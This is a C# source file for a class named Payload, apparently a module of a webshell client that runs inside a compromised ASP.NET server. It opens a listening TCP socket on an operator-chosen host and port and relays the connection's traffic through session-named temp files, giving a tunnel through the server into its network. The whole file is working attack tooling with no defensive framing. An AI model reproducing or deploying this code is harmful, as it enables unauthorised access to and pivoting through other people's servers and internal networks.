using System;
using System.Web;
using System.IO;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Runtime.Serialization;

public class Payload
{
    [DataContract]
    class Ret
    {

        [DataMember]
        public int code = 1;

        [DataMember]
        public string msg = "";
    }
    Ret ret;

    string outfile;
    string infile;
    Mutex mut;
    public string Run()
    {
        HttpContext.Current.Server.ScriptTimeout = 3600;
        Ret ret = new Ret();
        outfile = Path.Combine(Path.GetTempPath(), Global.sessionid + "_out");
        infile = Path.Combine(Path.GetTempPath(), Global.sessionid + "_in");
        using (File.Create(infile)) ;
        using (File.Create(outfile)) ;
        mut = new Mutex(false, Global.sessionid+"_test123");
        Socket server;
        Socket client = null;
        try
        {
            server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            server.Bind(new IPEndPoint(IPAddress.Parse(Global.rhost), Global.rport));
            server.Listen(1);
            server.Blocking = false;
            while(File.Exists(infile) && File.Exists(outfile)){
                try{
                    client = server.Accept();
                }catch(SocketException){
                    Thread.Sleep(100);
                    continue;
                }
                break;
            }
            server.Close();
            if(!File.Exists(infile) || !File.Exists(outfile)) return Global.json_encode(ret);
        }
        catch (Exception e)
        {
            ret.code = -1;
            ret.msg = Convert.ToBase64String(Encoding.UTF8.GetBytes(e.ToString()));
            return Global.json_encode(ret);
        }
        using(File.Create(Path.Combine(Path.GetTempPath(), Global.sessionid + "_sign")));//创建一个文件表示连接成功
        client.Blocking = false;
        Thread read_thread = new Thread(this.ReadToFile);
        read_thread.Start(client);
        while (File.Exists(infile) && File.Exists(outfile))
        {
            byte[] data;
            try
            {
                mut.WaitOne();
                data = File.ReadAllBytes(infile);
                File.WriteAllText(infile, "");
            }
            catch (Exception)
            {
                break;
            }finally{
                mut.ReleaseMutex();
            }
            if(data.Length>0){
                try{
                    client.Send(data);
                }catch(SocketException){break;}
            }
            Thread.Sleep(100);
        }
        try
        {
            client.Shutdown(SocketShutdown.Both);
            client.Close();
        }
        catch (Exception) { }
        read_thread.Join(5000);
        return Global.json_encode(ret);
    }

    public void ReadToFile(Object obj)
    {
        Socket client = (Socket)obj;
        while (File.Exists(infile) && File.Exists(outfile))
        {
            byte[] data = new byte[16384];
            int l = 0;
            try
            {
                l = client.Receive(data, 16384, SocketFlags.None);
            }
            catch (SocketException) { }
            catch (ObjectDisposedException) { break; }
            if (l > 0)
            {
                try
                {
                    mut.WaitOne();
                    using (FileStream stream = File.Open(outfile, FileMode.Append, FileAccess.Write))
                    {
                        stream.Write(data, 0, l);
                    }
                }catch(Exception){break;}finally{mut.ReleaseMutex();}
            }
            Thread.Sleep(100);
        }
    }
}